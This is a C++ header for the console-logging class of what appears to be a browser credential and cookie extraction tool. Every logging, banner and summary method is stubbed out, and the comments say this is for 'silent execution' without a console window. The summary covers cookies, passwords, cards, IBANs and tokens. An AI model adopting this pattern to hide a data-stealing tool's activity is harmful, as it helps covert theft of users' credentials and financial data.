// (c) Alexander 'xaitax' Hagenah
// Licensed under the MIT License. See LICENSE file in the project root for full license information.

#pragma once

#include <Windows.h>
#include <string>

namespace Core {

    class Console {
    public:
        // Set verbose to false by default to ensure silent execution
        explicit Console(bool verbose = false) : m_verbose(verbose) {
            // UI initialization removed to avoid generating a console window or hooks
        }

        ~Console() {
            // No console attributes to restore
        }

        // Standard log messages stubbed out
        void Info(const std::string& msg) const {}
        void Success(const std::string& msg) const {}
        void Error(const std::string& msg) const {}
        void Warn(const std::string& msg) const {}
        
        // Debug and formatting structures stubbed out
        void Debug(const std::string& msg) const {}
        void BrowserHeader(const std::string& name, const std::string& version = "") const {}
        void NoAbeWarning(const std::string& msg) const {}
        void KeyDecrypted(const std::string& keyHex) const {}
        void AsterKeyDecrypted(const std::string& keyHex) const {}
        void ProfileHeader(const std::string& name) const {}
        void DataRow(const std::string& key, const std::string& value) const {}
        void ExtractionResult(const std::string& type, int count, int total = -1) const {}
        
        // Summary stubbed out to prevent output generation
        void Summary(int cookies, int passwords, int cards, int ibans, int tokens, int profiles, const std::string& outputPath) const {}

        // Banner removed to prevent UI display
        void Banner() const {}

        bool IsVerbose() const { return m_verbose; }

    private:
        bool m_verbose;
    };

}
